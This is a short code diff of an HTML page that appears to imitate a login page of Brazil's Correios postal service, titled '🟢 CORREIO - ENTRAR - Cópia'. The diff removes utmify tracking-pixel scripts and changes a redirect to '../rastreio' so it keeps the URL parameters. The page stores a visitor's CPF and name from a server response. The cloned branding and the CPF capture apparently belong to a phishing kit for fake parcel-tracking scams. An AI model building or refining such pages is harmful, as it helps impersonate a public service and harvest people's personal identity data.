@@ -1,21 +1,7 @@
 <html lang="pt-BR">
 
 <head>
-    <script>
-        window.pixelId = "67e1f68ad6279fd57c0944f5";
-        var a = document.createElement("script");
-        a.setAttribute("async", "");
-        a.setAttribute("defer", "");
-        a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-        document.head.appendChild(a);
-    </script>
-<script
-  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
-  data-utmify-prevent-xcod-sck
-  data-utmify-prevent-subids
-  async
-  defer
-></script>
+
 
     <title>🟢 CORREIO - ENTRAR - Cópia</title>
     <meta name="viewport"
@@ -197,7 +183,9 @@
                     sessionStorage.setItem("cpf", data.cpf)
                     sessionStorage.setItem("nome", data.nome)
                     sessionStorage.setItem("data_atual", data.data_atual)
-                    window.location.href = "../rastreio"
+                    var currentUrlParams = window.location.search;
+                    window.location.href = "../rastreio" + currentUrlParams;
+                    
                 } else {
                     throw new Error(data.message || "CPF incorreto! Digite novamente")
                 }
